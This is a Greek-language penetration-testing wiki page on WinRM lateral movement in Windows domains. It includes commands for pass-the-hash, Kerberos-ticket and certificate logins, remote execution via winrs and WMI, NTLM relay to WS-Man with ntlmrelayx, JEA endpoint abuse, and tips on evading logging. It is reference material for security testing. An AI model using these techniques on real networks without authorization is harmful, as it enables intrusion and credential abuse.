# WinRM

{{#include ../../banners/hacktricks-training.md}}

Το WinRM είναι ένας από τους πιο βολικούς τρόπους για **lateral movement** σε περιβάλλοντα Windows, καθώς παρέχει απομακρυσμένο shell μέσω **WS-Man/HTTP(S)** χωρίς να χρειάζονται τεχνάσματα δημιουργίας υπηρεσιών SMB. Αν ο στόχος εκθέτει τις θύρες **5985/5986** και ο λογαριασμός σας έχει δικαίωμα χρήσης της απομακρυσμένης διαχείρισης, μπορείτε συχνά να περάσετε πολύ γρήγορα από τα «έγκυρα διαπιστευτήρια» σε ένα «interactive shell».

Για **enumeration** πρωτοκόλλου/υπηρεσίας, listeners, ενεργοποίηση του WinRM, `Invoke-Command` και γενική χρήση client, δείτε:

{{#ref}}
../../network-services-pentesting/5985-5986-pentesting-winrm.md
{{#endref}}

## Γιατί αρέσει το WinRM στους operators

- Χρησιμοποιεί **HTTP/HTTPS** αντί για SMB/RPC, επομένως συχνά λειτουργεί σε περιπτώσεις όπου μπλοκάρεται η εκτέλεση τύπου PsExec.
- Με **Kerberos**, αποφεύγει την αποστολή επαναχρησιμοποιήσιμων διαπιστευτηρίων στον στόχο.
- Λειτουργεί ομαλά με εργαλεία για **Windows**, **Linux** και **Python** (`winrs`, `evil-winrm`, `pypsrp`, `netexec`).
- Η διαδρομή interactive PowerShell remoting εκκινεί το **`wsmprovhost.exe`** στον στόχο, υπό το context του πιστοποιημένου χρήστη, κάτι που διαφέρει λειτουργικά από την εκτέλεση μέσω υπηρεσίας.

## Μοντέλο πρόσβασης και προαπαιτούμενα

Στην πράξη, το επιτυχές lateral movement μέσω WinRM εξαρτάται από **τρία** πράγματα:

1. Ο στόχος διαθέτει **WinRM listener** (`5985`/`5986`) και κανόνες firewall που επιτρέπουν την πρόσβαση.
2. Ο λογαριασμός μπορεί να πραγματοποιήσει **authentication** στο endpoint.
3. Ο λογαριασμός έχει δικαίωμα να **ανοίξει remoting session**.

Συνήθεις τρόποι απόκτησης αυτής της πρόσβασης:

- **Local Administrator** στον στόχο.
- Συμμετοχή στην ομάδα **Remote Management Users** σε νεότερα συστήματα ή στην **WinRMRemoteWMIUsers__** σε συστήματα/στοιχεία που εξακολουθούν να αναγνωρίζουν αυτή την ομάδα.
- Ρητά δικαιώματα remoting που έχουν εκχωρηθεί μέσω local security descriptors / αλλαγών στα PowerShell remoting ACL.

Αν έχετε ήδη τον έλεγχο ενός υπολογιστή με δικαιώματα admin, θυμηθείτε ότι μπορείτε επίσης να **εκχωρήσετε πρόσβαση WinRM χωρίς πλήρη συμμετοχή σε ομάδα admin**, χρησιμοποιώντας τις τεχνικές που περιγράφονται εδώ:

{{#ref}}
../active-directory-methodology/security-descriptors.md
{{#endref}}

### Παγίδες authentication που έχουν σημασία κατά το lateral movement

- Το **Kerberos απαιτεί hostname/FQDN**. Αν συνδεθείτε μέσω IP, ο client συνήθως κάνει fallback σε **NTLM/Negotiate**.
- Σε περιπτώσεις **workgroup** ή μεταξύ διαφορετικών trust, το NTLM συνήθως απαιτεί είτε **HTTPS** είτε να προστεθεί ο στόχος στα **TrustedHosts** του client.
- Με **local accounts** μέσω Negotiate σε workgroup, οι απομακρυσμένοι περιορισμοί UAC μπορεί να εμποδίσουν την πρόσβαση, εκτός αν χρησιμοποιηθεί ο ενσωματωμένος λογαριασμός Administrator ή οριστεί `LocalAccountTokenFilterPolicy=1`.
- Το PowerShell remoting χρησιμοποιεί από προεπιλογή το **`HTTP/<host>` SPN**. Σε περιβάλλοντα όπου το `HTTP/<host>` είναι ήδη καταχωρισμένο σε κάποιον άλλο λογαριασμό υπηρεσίας, το WinRM Kerberos μπορεί να αποτύχει με `0x80090322`. Χρησιμοποιήστε SPN με προσδιορισμένη θύρα ή επιλέξτε **`WSMAN/<host>`**, αν υπάρχει αυτό το SPN.<sup>[[3]](#references)</sup>

Αν αποκτήσετε έγκυρα διαπιστευτήρια μέσω password spraying, η επαλήθευσή τους μέσω WinRM είναι συχνά ο ταχύτερος τρόπος να ελέγξετε αν μπορούν να σας δώσουν shell:

{{#ref}}
../active-directory-methodology/password-spraying.md
{{#endref}}

## Lateral movement από Linux σε Windows

### NetExec / CrackMapExec για validation και εκτέλεση μίας εντολής

```bash
# Validate creds and execute a simple command
netexec winrm <HOST_FQDN> -u <USER> -p '<PASSWORD>' -x "whoami /all"

# Pass-the-Hash
netexec winrm <HOST_FQDN> -u <USER> -H <NTHASH> -x "hostname"

# PowerShell command instead of cmd.exe
netexec winrm <HOST_FQDN> -u <USER> -H <NTHASH> -X '$PSVersionTable'
```

### Evil-WinRM για διαδραστικά shells

Το `evil-winrm` παραμένει η πιο βολική διαδραστική επιλογή από Linux, επειδή υποστηρίζει **κωδικούς πρόσβασης**, **NT hashes**, **Kerberos tickets**, **client certificates**, μεταφορά αρχείων και φόρτωση PowerShell/.NET στη μνήμη.

```bash
# Password
evil-winrm -i <HOST_FQDN> -u <USER> -p '<PASSWORD>'

# Pass-the-Hash
evil-winrm -i <HOST_FQDN> -u <USER> -H <NTHASH>

# Kerberos using an existing ccache/kirbi
export KRB5CCNAME=./user.ccache
evil-winrm -i <HOST_FQDN> -r <REALM.LOCAL>
```

### Ειδική περίπτωση Kerberos SPN: `HTTP` vs `WSMAN`

Όταν το προεπιλεγμένο SPN **`HTTP/<host>`** προκαλεί αποτυχίες Kerberos, δοκιμάστε να ζητήσετε/χρησιμοποιήσετε ένα ticket **`WSMAN/<host>`**. Αυτό εμφανίζεται σε περιβάλλοντα enterprise με ενισχυμένη ασφάλεια ή ασυνήθιστες ρυθμίσεις, όπου το **`HTTP/<host>`** είναι ήδη συσχετισμένο με άλλον λογαριασμό υπηρεσίας.<sup>[[3]](#references)</sup>

```bash
# Example: use a WSMAN ticket instead of the default HTTP SPN
export KRB5CCNAME=administrator@WSMAN_srv01.domain.local@DOMAIN.LOCAL.ccache
evil-winrm -i srv01.domain.local -r DOMAIN.LOCAL --spn WSMAN
```

Αυτό είναι επίσης χρήσιμο μετά από κατάχρηση των **RBCD / S4U**, όταν έχετε πλαστογραφήσει ή ζητήσει συγκεκριμένα ένα service ticket **WSMAN** αντί για ένα γενικό ticket `HTTP`.

### Πιστοποίηση βάσει πιστοποιητικού

Το WinRM υποστηρίζει επίσης **client certificate authentication**, αλλά το πιστοποιητικό πρέπει να αντιστοιχιστεί στον στόχο με έναν **local account**. Από επιθετική σκοπιά, αυτό έχει σημασία όταν:

- έχετε ήδη υποκλέψει/εξαγάγει ένα έγκυρο client certificate και private key που έχουν αντιστοιχιστεί για WinRM·
- έχετε κάνει κατάχρηση των **AD CS / Pass-the-Certificate** για να αποκτήσετε πιστοποιητικό για έναν principal και στη συνέχεια να μεταβείτε σε άλλη διαδρομή πιστοποίησης·
- δραστηριοποιείστε σε περιβάλλοντα που αποφεύγουν σκόπιμα την απομακρυσμένη πρόσβαση με πιστοποίηση βάσει κωδικού πρόσβασης.

```bash
evil-winrm -i <HOST_FQDN> -S -c user.crt -k user.key
```

Το WinRM με client-certificate είναι πολύ λιγότερο συνηθισμένο από το password/hash/Kerberos auth, αλλά όταν υπάρχει μπορεί να προσφέρει μια διαδρομή **passwordless lateral movement** που παραμένει διαθέσιμη μετά την αλλαγή του password.

### Python / αυτοματοποίηση με `pypsrp`

Αν χρειάζεστε αυτοματοποίηση αντί για operator shell, το `pypsrp` παρέχει WinRM/PSRP από Python με υποστήριξη για **NTLM**, **certificate auth**, **Kerberos** και **CredSSP**.<sup>[[2]](#references)</sup>

```python
from pypsrp.client import Client

client = Client(
    "srv01.domain.local",
    username="DOMAIN\\user",
    password="Password123!",
    ssl=False,
)
stdout, stderr, rc = client.execute_cmd("whoami /all")
print(stdout, stderr, rc)
```


Αν χρειάζεστε πιο λεπτομερή έλεγχο από αυτόν που παρέχει το wrapper υψηλού επιπέδου `Client`, τα API χαμηλότερου επιπέδου `WSMan` + `RunspacePool` είναι χρήσιμα για δύο συνηθισμένα προβλήματα των operators:

- επιβολή του **`WSMAN`** ως υπηρεσίας/SPN Kerberos αντί για την προεπιλεγμένη προσδοκία **`HTTP`** που χρησιμοποιούν πολλοί clients του PowerShell·
- σύνδεση σε **PSRP endpoint** που δεν είναι το προεπιλεγμένο, όπως μια διαμόρφωση περιόδου λειτουργίας **JEA** / custom, αντί για το `Microsoft.PowerShell`.

```python
from pypsrp.wsman import WSMan
from pypsrp.powershell import PowerShell, RunspacePool

wsman = WSMan(
    "srv01.domain.local",
    auth="kerberos",
    ssl=False,
    negotiate_service="WSMAN",
)

with wsman, RunspacePool(wsman, configuration_name="MyJEAEndpoint") as pool, PowerShell(pool) as ps:
    ps.add_script("whoami; Get-Command")
    output = ps.invoke()
    print(output)
```

### Τα προσαρμοσμένα PSRP endpoints και το JEA έχουν σημασία κατά την πλευρική μετακίνηση

Η επιτυχής πιστοποίηση μέσω WinRM **δεν** σημαίνει πάντα ότι αποκτάτε πρόσβαση στο προεπιλεγμένο, χωρίς περιορισμούς endpoint `Microsoft.PowerShell`. Τα ώριμα περιβάλλοντα ενδέχεται να εκθέτουν **προσαρμοσμένες διαμορφώσεις συνεδριών** ή endpoints JEA με δικά τους ACL και συμπεριφορά εκτέλεσης ως άλλος χρήστης.<sup>[[1]](#references)</sup>

Αν έχετε ήδη δυνατότητα εκτέλεσης κώδικα σε έναν host Windows και θέλετε να δείτε ποιες επιφάνειες remoting υπάρχουν, απαριθμήστε τα καταχωρισμένα endpoints:

```powershell
Get-PSSessionConfiguration | Select-Object Name, Permission
```

Όταν υπάρχει ένα χρήσιμο endpoint, στόχευσέ το ρητά αντί για το προεπιλεγμένο shell:

```powershell
Enter-PSSession -ComputerName srv01.domain.local -ConfigurationName MyJEAEndpoint
```

Πρακτικές επιπτώσεις για offensive χρήση:

- Ένα **restricted** endpoint μπορεί και πάλι να αρκεί για lateral movement, αν εκθέτει ακριβώς τα κατάλληλα cmdlets/functions για service control, file access, process creation ή αυθαίρετη εκτέλεση .NET / εξωτερικών εντολών.
- Ένα **misconfigured JEA** role είναι ιδιαίτερα πολύτιμο όταν εκθέτει επικίνδυνες εντολές όπως `Start-Process`, ευρεία wildcards, writable providers ή custom proxy functions που επιτρέπουν την παράκαμψη των προβλεπόμενων περιορισμών.
- Endpoints που βασίζονται σε **RunAs virtual accounts** ή **gMSAs** αλλάζουν το effective security context των εντολών που εκτελείτε. Ειδικότερα, ένα endpoint που βασίζεται σε gMSA μπορεί να παρέχει **network identity στο δεύτερο hop**, ακόμα κι όταν μια κανονική WinRM session θα αντιμετώπιζε το κλασικό πρόβλημα delegation.

Για ένα custom restricted endpoint, ελέγξτε ξεχωριστά τα effective command και script permissions: μια σύντομη λίστα `Get-Command` από μόνη της δεν αποδεικνύει ότι δεν μπορεί να εκτελεστεί ένα υπάρχον `.ps1`. Τα [JEA role capabilities](https://learn.microsoft.com/en-us/powershell/scripting/security/remoting/jea/role-capabilities) καθορίζουν ρητά ποια script paths μπορούν να κληθούν· άλλα custom endpoints ενδέχεται να εφαρμόζουν διαφορετικούς κανόνες session. Αν ένα επιτρεπόμενο script χρησιμοποιεί αποθηκευμένο `SecureString` για να δημιουργήσει credential για άλλο host, ένα blob που δημιουργήθηκε χωρίς ρητό key χρησιμοποιεί [Windows DPAPI](https://learn.microsoft.com/en-us/powershell/module/microsoft.powershell.security/convertfrom-securestring) και γενικά απαιτεί το πλαίσιο χρήστη και μηχανήματος που το προστάτευσε για την αποκρυπτογράφησή του. Ελέγξτε το ACL του script, την επιτρεπόμενη κλήση, την ταυτότητα run-as και τα δικαιώματα credential στα downstream συστήματα πριν θεωρήσετε ότι ένα writable source ή ένα αντιγραμμένο blob αποτελεί διαδρομή escalation μεταξύ hosts. Μην εμφανίζετε την προστατευμένη τιμή κατά την παθητική enumeration.

Για μια JEA custom function που δέχεται file path, ελέγξτε μαζί το ACL του registered endpoint, το mapped role capability και την effective ταυτότητα run-as. Ο caller μπορεί να έχει `NoLanguage`, ενώ το σώμα της function εκτελείται στο προεπιλεγμένο language mode του συστήματος· ένα virtual account μπορεί επίσης να έχει δικαιώματα local administrator. Αν η function ελέγχει έναν επιτρεπόμενο κατάλογο με raw string prefix και στη συνέχεια διαβάζει το παρεχόμενο path, τα στοιχεία `..` μπορεί να επιλύονται εκτός αυτού του καταλόγου. Το όριο είναι το resolved path υπό την ταυτότητα της function, όχι το language mode του caller ή το φαινομενικό prefix. Επιβεβαιώστε ότι η function είναι προσβάσιμη και ότι γίνεται validation του final path πριν θεωρήσετε ένα αναγνώσιμο αρχείο `.psrc` ή `.pssc` εύρημα privileged file-read. Δείτε τις οδηγίες της Microsoft για τα [JEA role capabilities](https://learn.microsoft.com/en-us/powershell/scripting/security/remoting/jea/role-capabilities) και τις [security considerations](https://learn.microsoft.com/en-us/powershell/scripting/security/remoting/jea/security-considerations).

## Windows-native lateral movement μέσω WinRM

### `winrs.exe`

Το `winrs.exe` είναι ενσωματωμένο και χρήσιμο όταν θέλετε **εγγενή εκτέλεση εντολών μέσω WinRM** χωρίς να ανοίξετε interactive PowerShell remoting session:

```cmd
winrs -r:srv01.domain.local cmd /c whoami
winrs -r:https://srv01.domain.local:5986 -u:DOMAIN\\user -p:Password123! hostname
```

Δύο flags είναι εύκολο να ξεχαστούν και έχουν σημασία στην πράξη:

- Το `/noprofile` απαιτείται συχνά όταν ο απομακρυσμένος principal **δεν** είναι τοπικός administrator.
- Το `/allowdelegate` επιτρέπει στο απομακρυσμένο shell να χρησιμοποιεί τα credentials σας σε έναν **τρίτο host** (για παράδειγμα, όταν η εντολή χρειάζεται `\\fileserver\share`).

```cmd
winrs -r:srv01.domain.local /noprofile cmd /c set
winrs -r:srv01.domain.local /allowdelegate cmd /c dir \\fileserver.domain.local\share
```

Λειτουργικά, το `winrs.exe` συνήθως οδηγεί σε μια απομακρυσμένη αλυσίδα διεργασιών παρόμοια με:

```text
svchost.exe (DcomLaunch) -> winrshost.exe -> cmd.exe /c <command>
```

Αξίζει να το θυμάστε, επειδή διαφέρει από το service-based exec και τις interactive PSRP sessions.

### `winrm.cmd` / WS-Man COM αντί για PowerShell remoting

Μπορείτε επίσης να εκτελέσετε εντολές μέσω του **WinRM transport** χωρίς `Enter-PSSession`, καλώντας κλάσεις WMI μέσω WS-Man. Έτσι, το transport παραμένει WinRM, ενώ ο μηχανισμός απομακρυσμένης εκτέλεσης γίνεται **WMI `Win32_Process.Create`**:

```cmd
winrm invoke Create wmicimv2/Win32_Process @{CommandLine="cmd.exe /c whoami > C:\\Windows\\Temp\\who.txt"} -r:srv01.domain.local
```

Αυτή η προσέγγιση είναι χρήσιμη όταν:

- Η καταγραφή του PowerShell παρακολουθείται εντατικά.
- Θέλετε **μεταφορά WinRM**, αλλά όχι μια κλασική ροή εργασίας PS remoting.
- Δημιουργείτε ή χρησιμοποιείτε custom εργαλεία γύρω από το αντικείμενο COM **`WSMan.Automation`**.

## NTLM relay προς WinRM (WS-Man)

Όταν το SMB relay αποκλείεται από το signing και το LDAP relay υπόκειται σε περιορισμούς, το **WS-Man/WinRM** μπορεί να παραμένει ένας ελκυστικός στόχος relay. Το σύγχρονο `ntlmrelayx.py` περιλαμβάνει **διακομιστές WinRM relay** και μπορεί να κάνει relay σε στόχους **`wsman://`** ή **`winrms://`**.

```bash
# Relay to HTTP WinRM
ntlmrelayx.py -t wsman://srv01.domain.local --no-smb-server -smb2support

# Relay to HTTPS WinRM
ntlmrelayx.py -t winrms://srv01.domain.local --no-smb-server -smb2support
```

Δύο πρακτικές σημειώσεις:

- Το Relay είναι πιο χρήσιμο όταν ο στόχος αποδέχεται **NTLM** και επιτρέπεται στο principal που γίνεται relay να χρησιμοποιεί WinRM.
- Ο πρόσφατος κώδικας Impacket χειρίζεται ειδικά αιτήματα **`WSMANIDENTIFY: unauthenticated`**, ώστε probes τύπου `Test-WSMan` να μη διακόπτουν τη ροή του relay.

Για περιορισμούς multi-hop αφού αποκτήσετε την πρώτη συνεδρία WinRM, δείτε:

{{#ref}}
../active-directory-methodology/kerberos-double-hop-problem.md
{{#endref}}

## Σημειώσεις OPSEC και ανίχνευσης

- Το **Interactive PowerShell remoting** συνήθως δημιουργεί το **`wsmprovhost.exe`** στον στόχο.
- Το **`winrs.exe`** συνήθως δημιουργεί το **`winrshost.exe`** και έπειτα την αιτούμενη child process.
- Προσαρμοσμένα endpoints **JEA** μπορεί να εκτελούν ενέργειες ως virtual accounts **`WinRM_VA_*`** ή ως διαμορφωμένο **gMSA**, κάτι που αλλάζει τόσο την τηλεμετρία όσο και τη συμπεριφορά του δεύτερου hop σε σχέση με ένα shell στο context ενός κανονικού χρήστη.<sup>[[1]](#references)</sup>
- Αν χρησιμοποιήσετε PSRP αντί για raw `cmd.exe`, αναμένετε τηλεμετρία **network logon**, συμβάντα της υπηρεσίας WinRM και καταγραφή PowerShell operational/script-block.
- Αν χρειάζεστε μόνο μία εντολή, το `winrs.exe` ή η εκτέλεση WinRM μίας εντολής μπορεί να είναι πιο διακριτική από μια μακρόβια διαδραστική συνεδρία remoting.
- Αν είναι διαθέσιμο το Kerberos, προτιμήστε **FQDN + Kerberos** αντί για IP + NTLM, ώστε να μειώσετε τόσο τα προβλήματα εμπιστοσύνης όσο και τις άβολες αλλαγές στο `TrustedHosts` από την πλευρά του client.

## References

- [1] [Microsoft: Ζητήματα ασφαλείας του JEA](https://learn.microsoft.com/en-us/powershell/scripting/security/remoting/jea/security-considerations?view=powershell-7.6)
- [2] [Αρχείο README του pypsrp](https://github.com/jborean93/pypsrp)
- [3] [Microsoft: Σφάλμα `0x80090322` κατά τη σύνδεση του PowerShell σε απομακρυσμένο server μέσω WinRM](https://learn.microsoft.com/en-us/troubleshoot/windows-server/system-management-components/error-0x80090322-when-connecting-powershell-to-remote-server-via-winrm)
{{#include ../../banners/hacktricks-training.md}}
